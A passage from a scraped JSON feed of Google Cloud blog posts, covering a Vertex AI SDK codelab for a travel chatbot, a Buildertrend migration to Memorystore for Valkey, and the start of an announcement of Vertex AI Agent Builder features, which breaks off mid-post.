href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dive into the codelab and build your first AI application today!</strong></a></p>\n<h2><span style=\"vertical-align: baseline;\">Setting the Stage: Your First Project</span></h2>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this codelab</span></a><span style=\"vertical-align: baseline;\">, you'll step into the role of a developer at a travel company tasked with building a new chat application. You'll start with a basic web application frontend and, step-by-step, you will bring it to life by connecting it to the power of </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">generative AI</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">By the end, you will have built a travel assistant that can:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Answer questions about travel destinations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Provide personalized recommendations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Fetch real-time data, like the weather, to give genuinely helpful advice.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The process is broken down into a few key stages.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Making the First Connection</span></h2>\n<p><span style=\"vertical-align: baseline;\">Before you can do anything fancy, you need to get your application talking to the </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI model</span></a><span style=\"vertical-align: baseline;\">. An easy way to do this is with the </span><a href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\">, a complete library for interacting with the </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI platform</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"making_the_first_connection\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/making_the_first_connection.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While the </span><a href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\"> is a powerful tool for the full machine learning lifecycle, this lab focuses on one of its most-used tools: building </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">generative AI</span></a><span style=\"vertical-align: baseline;\"> applications. This part of the </span><a href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\"> acts as the bridge between your application and the </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\">. Without it, you would have to manually handle all the complex wiring yourself—writing code to manage authentication, formatting intricate API requests, and parsing the responses. The Vertex AI SDK handles all that complexity for you so you can focus on what you actually want to do: send a message and get a response. </span></p>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this codelab</span></a><span style=\"vertical-align: baseline;\">, you'll see just how simple it is.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Giving your AI purpose with system instructions</span></h2>\n<p><span style=\"vertical-align: baseline;\">Once your app is connected, you'll notice the AI's responses won't be tailored to your purposes yet. One way you can make it more useful for your specific use case is by giving it </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/learn/prompts/system-instructions?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">system instructions</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Hot Tip: Use Google AI Studio to Create Your System Instructions</span></h3>\n<p><span style=\"vertical-align: baseline;\">A great way to develop your </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/learn/prompts/system-instructions?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">system instructions</span></a><span style=\"vertical-align: baseline;\"> is to leverage </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> as a creative partner to draft them for you. For example, you could ask </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://aistudio.google.com/welcome?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=FY25-global-DR-gsem-BKWS-1710442&amp;utm_content=text-ad-none-any-DEV_c-CRE_726176659625-ADGP_Hybrid%20%7C%20BKWS%20-%20EXA%20%7C%20Txt-AI%20Studio-AI%20Studio-KWID_1276544732073-kwd-1276544732073&amp;utm_term=KW_google%20ai%20studio-ST_google%20ai%20studio&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=21030196240&amp;gbraid=0AAAAACn9t67aW4ac1BtMao1eA_HHRwMKa&amp;gclid=EAIaIQobChMIp_fMhfXHkAMVPgytBh2JBgb2EAAYASAAEgJ3V_D_BwE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> to generate a thorough set of instructions for a \"sophisticated and friendly travel assistant.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">Once you have a draft, you can immediately test it, also in </span><a href=\"https://aistudio.google.com/welcome?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=FY25-global-DR-gsem-BKWS-1710442&amp;utm_content=text-ad-none-any-DEV_c-CRE_726176659625-ADGP_Hybrid%20%7C%20BKWS%20-%20EXA%20%7C%20Txt-AI%20Studio-AI%20Studio-KWID_1276544732073-kwd-1276544732073&amp;utm_term=KW_google%20ai%20studio-ST_google%20ai%20studio&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=21030196240&amp;gbraid=0AAAAACn9t67aW4ac1BtMao1eA_HHRwMKa&amp;gclid=EAIaIQobChMIp_fMhfXHkAMVPgytBh2JBgb2EAAYASAAEgJ3V_D_BwE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">. Start a new chat and in the panel to the right, set the </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\"> to the one you're using in your app and paste the text into the system instruction field. This allows you to quickly interact with the model and see how it behaves with your instructions, all without writing any code. When you're happy with the results, you can copy the final version directly into your application.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google AI Studio\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Google_AI_Studio.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Connecting Your AI to the Real World</span></h2>\n<p><span style=\"vertical-align: baseline;\">This is where you break the model out of its knowledge silo and connect it to live data. By default, an </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI model</span></a><span style=\"vertical-align: baseline;\">'s knowledge is limited to the data it was trained on; it doesn't know today's weather. However, you can provide </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> with access to external knowledge using a powerful feature called </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/multimodal/function-calling?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">function calling</span></a><span style=\"vertical-align: baseline;\">! </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"function-calling\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/function-calling.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The concept is simple: you write a basic Python function (like one to check the weather) and then describe that tool to the model. Then, when a user asks about the weather, the model can ask your application to run your function and use the live result in its answer. This allows the model to answer questions far beyond its training data, making it a much more powerful and useful assistant with access to up-to-the-minute information. </span></p>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this lab</span></a><span style=\"vertical-align: baseline;\">, we used the </span><a href=\"https://open-meteo.com/en/docs/geocoding-api\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Geocoding API</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://open-meteo.com/en/docs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Weather Forecast API</span></a><span style=\"vertical-align: baseline;\"> to provide the app with the ability to factor in the weather when answering questions about travel. </span></p>\n<h2><span style=\"vertical-align: baseline;\">Your Journey Starts Here</span></h2>\n<p><span style=\"vertical-align: baseline;\">Building with </span><a href=\"https://cloud.google.com/learn/what-is-artificial-intelligence?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI</span></a><span style=\"vertical-align: baseline;\"> isn't about knowing everything at once. It's about taking the first step, building something tangible, and learning key concepts along the way. </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">This codelab</span></a><span style=\"vertical-align: baseline;\"> was designed to be that first step. By the end, you won't just have a working travel chatbot—you'll have hands-on experience with the fundamental building blocks of a production-ready </span><a href=\"https://cloud.google.com/discover/ai-applications?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI application</span></a><span style=\"vertical-align: baseline;\">. You'll be surprised at what you can build.</span></p>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning! </span></p></div>",
        "published_date": "2025-11-06 10:15:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/buildertrend-migrates-to-memorystore-for-valkey/",
        "title": "How Buildertrend Drives Innovation with Memorystore for Valkey",
        "thumbnail": null,
        "author": "Ankit Sud",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor’s note:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> Today we hear from Buildertrend, a leading provider of cloud-based construction management software. Since 2006, the platform has helped more than a million users globally simplify business management, track financials, and improve communication. To support this massive scale and their ambitious vision, they rely on a robust technology stack on Google Cloud, including, recently, Memorystore for Valkey. Read on to hear about their migration from Memorystore for Redis to the new platform.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Running a construction business is a complex balancing act that requires a constant stream of real-time information to keep projects on track. At </span><strong style=\"vertical-align: baseline;\">Buildertrend, </strong><span style=\"vertical-align: baseline;\">we understand the challenges our customers face — from fluctuating material costs and supply chain delays to managing tight deadlines and the risk of budget overruns — and work to help construction professionals improve efficiency, reduce risk, and enhance collaboration, all while growing their bottom line. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge: Caching at scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The construction industry has historically been slow to adopt new technologies, hindering efficiency and scalability. At Buildertrend, we aim to change this by being at the forefront of adopting new technology. When </span><a href=\"https://cloud.google.com/blog/products/databases/announcing-general-availability-of-memorystore-for-valkey\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Memorystore for Valkey became generally available</span></a><span style=\"vertical-align: baseline;\">, we spent time looking into whether it could help us modernize our stack and deliver value to customers. We were attracted by Valkey's truly open source posture and its promised performance benefits over competing technologies.</span></p>\n<p><span style=\"vertical-align: baseline;\">Before adopting Memorystore for Valkey, we had used Memorystore for Redis. While it served our basic needs, we found ourselves hitting a wall when it came to a critical feature: native cross-regional replication. As we scaled, we needed a solution that could support a global user base and provide seamless failover in case of a disaster or other issues within a region. We also needed a modern connectivity model such as Google Cloud’s </span><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect</span></a><span style=\"vertical-align: baseline;\"> to enhance network security and efficiency.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a fully managed, scalable, and highly available in-memory data store, Memorystore for Valkey offered the key features we needed out of the box to take our platform to the next level. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">A modern solution for a modern problem</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Within this ecosystem, we use Memorystore for Valkey for a variety of critical functions, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Database-backed cache:</strong><span style=\"vertical-align: baseline;\"> Speeds up data retrieval for a faster user experience</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Session state:</strong><span style=\"vertical-align: baseline;\"> Manages user sessions for web applications</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Job storage:</strong><span style=\"vertical-align: baseline;\"> Handles asynchronous task queues for background processes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pub/Sub idempotency keys:</strong><span style=\"vertical-align: baseline;\"> Ensures messages are processed exactly once, preventing data duplication</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Authentication tokens</strong><span style=\"vertical-align: baseline;\">: Securely validates user identity with cryptographically signed tokens, enabling fast, scalable authentication</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By leveraging the cache in these scenarios, our application is fast, resilient, and ready to meet the demands of our growing customer base. The native cross regional replication helped us support a global user base without having to worry about keeping global caches in sync.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A seamless migration with minimal disruption</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Migrating from Memorystore for Redis to Memorystore for Valkey was a smooth process, thanks to close collaboration with the Google Cloud team. We worked with the Google Cloud team to identify the best approach, which for us involved exporting data to Google Cloud Storage and seeding the data at Valkey instance creation, allowing us to migrate with minimal downtime. Because Memorystore for Valkey natively supports Private Service Connect, we were able to eliminate a proxy layer that our engineers used to connect to our Memorystore for Redis instances, simplifying our stack and improving our networking posture.</span><strong style=\"vertical-align: baseline;\"> </strong></p>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead to a global future</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Although it's still early in our journey, the impact is already clear. Memorystore for Valkey has unlocked our ability to scale and drastically reduced our time to market. It has allowed our team to streamline and own deployment processes, so they can be more agile and responsive.</span></p>\n<p><span style=\"vertical-align: baseline;\">For us, the future is about global scalability. With nearly 300 Memorystore for Valkey instances in our fleet, we're building a globally available, cloud-native stack. Our most critical instances are highly optimized to serve up to 30,000 requests per second each, demonstrating the foundation's scalability and performance. </span></p>\n<p><span style=\"vertical-align: baseline;\">We strive to use scalable cloud-native technologies, and Memorystore for Valkey will enable us to continue down this path. By using the Memorystore for Valkey managed service, we not only solve technical problems, but also accelerate business growth and empower engineering teams to focus on what matters most: </span><strong style=\"vertical-align: baseline;\">building great products</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Ready to build with Memorystore for Valkey?</strong></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Like Buildertrend, you can leverage the power of a fully managed, scalable, and highly available in-memory data store to accelerate your applications and empower your development teams.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">To get started, explore the </span><a href=\"https://cloud.google.com/memorystore/docs/valkey\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Memorystore for Valkey documentation</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> and sign up for a Google Cloud account!</span></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/more-ways-to-build-and-scale-ai-agents-with-vertex-ai-agent-builder/",
        "title": "More ways to build, scale, and govern AI agents with Vertex AI Agent Builder",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/AI_agents_with_Vertex_AI_Agent_Builder.max-600x600.jpg",
        "author": "Mike Clark",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Many developers are prototyping AI agents, but moving to a scalable, secure, and well-managed production agent is far more complex. </span></p>\n<p><span style=\"vertical-align: baseline;\">Vertex AI </span><a href=\"https://cloud.google.com/products/agent-builder?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder</span></a><span style=\"vertical-align: baseline;\"> is Google Cloud's comprehensive and open platform to build, scale, and govern reliable agents. As a suite of products, it provides the choice builders need to create powerful agentic systems at global scale. </span></p>\n<p><span style=\"vertical-align: baseline;\">Since </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder's</span></a><span style=\"vertical-align: baseline;\"> public inception earlier this year, we've seen tremendous traction with components such as our Python </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK), </strong><span style=\"vertical-align: baseline;\">which has been downloaded over</span> <a href=\"https://pepy.tech/projects/google-adk?timeRange=threeMonths&amp;category=version&amp;includeCIDownloads=true&amp;granularity=daily&amp;viewType=line&amp;versions=1.17.0%2C1.16.0%2C1.15.1\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">7 million times</strong><span style=\"text-decoration: underline; vertical-align: baseline;\">. </span></a><span style=\"vertical-align: baseline;\">Agent Development Kit also powers agents for customers using </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/introducing-gemini-enterprise?e=48754805?utm_source%3Dlinkedin\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\"> and agents operating in products across Google. </span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we build on that momentum by announcing new capabilities across the entire agent lifecycle to help you build, scale, and govern AI agents. Now, you can: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build</strong><span style=\"vertical-align: baseline;\"> faster with</span><strong style=\"vertical-align: baseline;\"> control </strong><span style=\"vertical-align: baseline;\">agent context and reduce token usage with configurable context layers (Static, Turn, User, Cache)</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">via the ADK API.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scale</strong><span style=\"vertical-align: baseline;\"> in production with new managed services from the </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Engine (AE) </strong><span style=\"vertical-align: baseline;\">including new </span><strong style=\"vertical-align: baseline;\">observability and evaluation </strong><span style=\"vertical-align: baseline;\">capabilities </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Govern</strong><span style=\"vertical-align: baseline;\"> agents with confidence with new</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">features</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">including </span><strong style=\"vertical-align: baseline;\">native</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">agent identities</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">security safeguards</strong></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These new capabilities underscore our commitment to Agent Builder, and simplify the agent development lifecycle to meet you where you are, no matter which tech stack you choose. </span></p>\n<p><strong style=\"vertical-align: baseline;\">For reference, here’s what to use, and when:</strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_GgDhTHh.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>This diagram showcases the comprehensive makeup of Agent Builder neatly organized into the build, scale, and govern pillars.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">1. Build your AI agents faster</span></h3>\n<p><span style=\"vertical-align: baseline;\">Building an agent from a concept to a working product involves complex orchestration. That’s why we’ve improved </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ADK</strong></a><span style=\"vertical-align: baseline;\"> for your building experience:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build more robust agents:</strong><span style=\"vertical-align: baseline;\"> Use our adaptable plugins framework for custom logic (like policy enforcement or usage tracking). Or use our prebuilt plugins, including a new plugin for tool use that helps agents 'self-heal.' This means the agent can recognize when a tool call has failed and automatically retry the action in a new way.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More language support: </strong><span style=\"vertical-align: baseline;\">We are also enabling Go developers to build ADK agents (with a dedicated A2A Go SDK) alongside Python and Java, making the framework accessible to many more developers.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Single command deployment</strong><span style=\"vertical-align: baseline;\">: Once you have built an agent, you can now use the ADK CLI to deploy agents using a single command, </span><strong style=\"vertical-align: baseline;\">adk deploy</strong><code style=\"vertical-align: baseline;\">,</code><span style=\"vertical-align: baseline;\">to the Agent Engine (AE) runtime. This is a major upgrade to help you move your agent from local development to  live testing and production usage quickly and seamlessly.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">You can start building today with </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">adk-samples</span></a><span style=\"vertical-align: baseline;\"> on GitHub or on Vertex AI </span><a href=\"http://console.cloud.google.com/vertex-ai/agents/agent-garden\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Garden</span><span style=\"vertical-align: baseline;\"> -</span></a><span style=\"vertical-align: baseline;\"> a growing repository of curated agent samples, solutions, and tools, designed to accelerate your development and support one click deployment of your agents built with ADK.</span></p>\n<h3><span style=\"vertical-align: baseline;\">2. Scale your AI agents effectively</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once your agent is built and deployed, the next step is running it in production. As you scale from one agent to many, managing them effectively becomes a key challenge. That’s why we continue to expand the managed services available in </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-engine/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Agent Engine</strong></a><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> It provides the core capabilities for deploying and scaling the agents you create in Agent Builder</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Observability</strong><span style=\"vertical-align: baseline;\">: We’re bringing the local development environment that you know and love from </span><code style=\"vertical-align: baseline;\">adk web </code><span style=\"vertical-align: baseline;\">to Google Cloud to enable Cloud based production monitoring. Within Agent Engine, we are making it easy to: </span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Track key agent performanc</strong><span style=\"vertical-align: baseline;\">e metrics with a dashboard that measures token consumption, latency, error rates, and tool calls over time. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Find and fix production issues faster</strong><span style=\"vertical-align: baseline;\"> in a </span><strong style=\"vertical-align: baseline;\">traces tab </strong><span style=\"vertical-align: baseline;\">so you can dive into flyouts to visualize and understand the sequence of actions your agents are taking. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Interact with your deployed agent </strong><span style=\"vertical-align: baseline;\">(including past sessions or issues) with a </span><strong style=\"vertical-align: baseline;\">playground </strong><span style=\"vertical-align: baseline;\">to dramatically shorten your debug loop.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Quality &amp; evaluation:</strong><span style=\"vertical-align: baseline;\"> You told us that evaluating non-deterministic systems is a major challenge. We agree. Now, you can simulate agent performance using the new </span><strong style=\"vertical-align: baseline;\">Evaluation Layer</strong><span style=\"vertical-align: baseline;\"> that includes a </span><strong style=\"vertical-align: baseline;\">User Simulator</strong><span 